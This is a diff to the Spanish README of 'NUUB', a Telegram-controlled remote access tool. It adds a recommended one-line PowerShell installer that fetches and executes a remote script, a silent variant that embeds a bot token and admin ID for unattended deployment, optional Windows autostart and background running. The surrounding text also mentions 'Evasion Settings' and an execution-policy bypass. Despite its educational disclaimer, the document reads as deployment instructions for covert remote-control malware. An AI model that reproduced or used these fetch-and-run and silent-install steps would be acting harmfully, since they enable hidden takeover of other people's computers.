@@ -33,7 +33,30 @@ Remote Access Tool con Clean Architecture, encriptación AES-256-GCM, y múltipl
 
 ## Instalación
 
-### Método 1: Auto-Installer (Recomendado)
+### Método 1: Instalación Remota (una línea - Recomendado)
+
+Ejecuta una sola línea en PowerShell para descargar, configurar e instalar automáticamente:
+
+```powershell
+iex (irm https://github.com/TU_USUARIO/NUUB-VERSION-2/releases/latest/download/install.ps1)
+```
+
+**Requisitos**: Solo Windows 10+ y PowerShell (ya incluido). No necesita Node.js, Python, Visual Studio ni CMake.
+
+**Qué hace**:
+1. Descarga `nuub.exe` desde GitHub Releases
+2. Ejecuta el wizard de configuración (token Telegram, admin IDs, etc.)
+3. Genera `config.json`
+4. Opcionalmente configura auto-inicio en Windows
+5. Ejecuta el agente en background
+
+**Instalación silenciosa** (para despliegues automatizados):
+
+```powershell
+iex (irm https://github.com/TU_USUARIO/NUUB-VERSION-2/releases/latest/download/install.ps1 -BotToken "TU_TOKEN" -AdminId "TU_CHAT_ID" -Silent)
+```
+
+### Método 2: Auto-Installer integrado
 
 ```bash
 # Ejecutar nuub.exe por primera vez
@@ -48,19 +71,19 @@ nuub.exe
 # [6/6] Evasion Settings
 ```
 
-### Método 2: PowerShell
+### Método 3: PowerShell local
 
 ```powershell
 powershell -ExecutionPolicy Bypass -File tools\installer.ps1
 ```
 
-### Método 3: Batch Script
+### Método 4: Batch Script
 
 ```cmd
 tools\quick_setup.bat
 ```
 
-### Método 4: Python
+### Método 5: Python
 
 ```bash
 python3 tools/installer.py
@@ -212,3 +235,36 @@ Este software es para fines educacionales y de testing de seguridad autorizado. 
 ## Licencia
 
 Uso privado. No distribuir sin autorización.
+
+## Construcción y Distribución
+
+### Build & Release (desarrollador)
+
+Compilar, testear y empaquetar para distribución:
+
+```powershell
+# Build + test + package
+.\tools\build_release.ps1
+
+# Build + test + package + publish to GitHub Releases
+.\tools\build_release.ps1 -Publish
+
+# Versión específica
+.\tools\build_release.ps1 -Version "2.0.1" -Publish
+```
+
+**Requisitos en máquina de build**: Visual Studio 2022, CMake 3.25+, vcpkg.
+
+El script genera `release/nuub-vX.X.X.zip` listo para subir a GitHub Releases.
+
+### Flujo completo
+
+```
+DESARROLLADOR                          USUARIO (PC de prueba)
+──────────────                         ──────────────────────
+.\tools\build_release.ps1              iex (irm https://...)
+  ↓ Compila nuub.exe                     ↓ Descarga nuub.exe
+  ↓ Ejecuta 45 tests                     ↓ Wizard de configuración
+  ↓ Crea release/nuub-v2.0.0.zip         ↓ nuub.exe se ejecuta
+  ↓ (Opcional) Sube a GitHub             ↓ Bot de Telegram responde
+```
